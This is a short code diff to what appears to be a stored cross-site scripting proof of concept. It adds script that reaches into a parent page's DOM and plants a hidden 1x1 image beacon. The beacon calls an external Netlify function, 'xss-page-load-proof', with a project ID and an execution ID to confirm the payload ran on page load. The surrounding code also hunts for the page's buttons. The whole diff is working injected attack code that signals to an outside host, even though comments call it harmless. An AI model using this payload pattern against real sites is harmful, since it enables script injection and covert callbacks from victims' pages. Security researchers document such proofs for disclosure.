@@ -15,6 +15,26 @@
     doc.body.appendChild(marker);
   }
 
+  // Create a harmless, fixed-data image marker in the top-level Create DOM.
+  // Its Netlify Function stores only execution time, a random run ID, and the
+  // already-public owned project ID so page-load execution can be verified
+  // without browser automation or retaining any account/session data.
+  if (!doc.getElementById('create-page-load-xss-proof-beacon')) {
+    const beacon = doc.createElement('img');
+    beacon.id = 'create-page-load-xss-proof-beacon';
+    beacon.alt = '';
+    beacon.width = 1;
+    beacon.height = 1;
+    beacon.hidden = true;
+    const executionId = parent.crypto.randomUUID();
+    beacon.src =
+      'https://warm-semifreddo-a04774.netlify.app/.netlify/functions/xss-page-load-proof' +
+      '?mode=mark&projectId=6acf9e083b59db6429ab7e8d&executionId=' +
+      encodeURIComponent(executionId);
+    doc.body.appendChild(beacon);
+    root.setAttribute('data-create-page-load-execution-id', executionId);
+  }
+
   let tries = 0;
   const timer = parent.setInterval(() => {
     const addImage = [...doc.querySelectorAll('button')].find((button) =>
